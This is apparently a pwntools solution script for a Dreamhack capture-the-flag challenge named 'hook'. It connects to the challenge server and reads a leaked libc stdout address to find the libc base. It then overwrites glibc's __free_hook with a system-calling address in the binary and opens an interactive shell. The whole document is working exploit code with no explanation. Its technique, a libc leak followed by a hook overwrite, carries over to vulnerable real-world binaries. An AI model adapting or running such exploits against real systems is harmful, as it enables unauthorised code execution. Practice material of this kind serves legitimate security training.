from pwn import *
p=remote("host1.dreamhack.games",16378)
e=ELF("./hook")
libc=ELF("./libc-2.23.so")
og_offset=0x4527a
mainsystem=0x400a11
#0xf03a4 0xf1247

p.recvuntil("stdout: ")
stdout_libc=int(p.recvline()[:-1],16)
baseadr=stdout_libc-libc.symbols["_IO_2_1_stdout_"]
#ogadr=baseadr+og_offset
freehookadr=baseadr+libc.symbols["__free_hook"]


payload=p64(freehookadr)+p64(mainsystem)
p.sendlineafter(b"Size: ",b"1000")
p.sendlineafter(b"Data: ",payload)
p.interactive()